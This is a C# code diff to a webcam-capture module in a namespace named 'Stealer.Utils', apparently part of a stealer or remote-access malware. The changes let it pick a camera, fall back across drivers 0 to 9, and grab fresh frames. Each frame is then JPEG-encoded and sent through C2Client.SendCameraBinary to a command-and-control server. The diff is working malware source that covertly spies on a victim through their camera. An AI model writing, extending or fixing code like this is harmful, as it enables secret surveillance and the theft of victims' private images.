@@ -44,11 +44,15 @@ namespace Stealer.Utils
         private const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
         private const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
         private const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
+        private const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
         private const uint CF_BITMAP = 2;
 
-        public static void Start(int fps, int quality)
+        private static int _selectedCamIndex = 0;
+
+        public static void Start(int fps, int quality, int camIndex = 0)
         {
-            if (_running) return;
+            if (_running) Stop();
+            _selectedCamIndex = camIndex;
             _running = true;
             _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
             _captureThread.Start();
@@ -66,7 +70,7 @@ namespace Stealer.Utils
 
             try
             {
-                // Create invisible capture window
+                // Create capture window
                 hCap = capCreateCaptureWindowA("CapWindow", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                 if (hCap == IntPtr.Zero)
                 {
@@ -74,8 +78,18 @@ namespace Stealer.Utils
                     return;
                 }
 
-                // Connect to webcam driver 0
-                IntPtr connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero);
+                // Connect to webcam driver (_selectedCamIndex or search 0..9)
+                IntPtr connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedCamIndex, IntPtr.Zero);
+                if (connected == IntPtr.Zero)
+                {
+                    for (int i = 0; i < 10; i++)
+                    {
+                        if (i == _selectedCamIndex) continue;
+                        connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
+                        if (connected != IntPtr.Zero) break;
+                    }
+                }
+
                 if (connected == IntPtr.Zero)
                 {
                     DestroyWindow(hCap);
@@ -91,7 +105,9 @@ namespace Stealer.Utils
                 {
                     try
                     {
-                        // Grab frame to clipboard
+                        // 1. Grab fresh video frame from camera hardware
+                        SendMessage(hCap, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
+                        // 2. Copy grabbed frame to clipboard bitmap
                         SendMessage(hCap, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);
 
                         if (OpenClipboard(IntPtr.Zero))
@@ -105,7 +121,10 @@ namespace Stealer.Utils
                                     {
                                         bmp.Save(ms, jpegEncoder, qualityParam);
                                         byte[] data = ms.ToArray();
-                                        C2Client.SendCameraBinary(data);
+                                        if (data != null && data.Length > 0)
+                                        {
+                                            C2Client.SendCameraBinary(data);
+                                        }
                                     }
                                 }
                             }
@@ -117,7 +136,6 @@ namespace Stealer.Utils
                     Thread.Sleep(delay);
                 }
 
-                // Disconnect driver
                 SendMessage(hCap, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
                 DestroyWindow(hCap);
             }
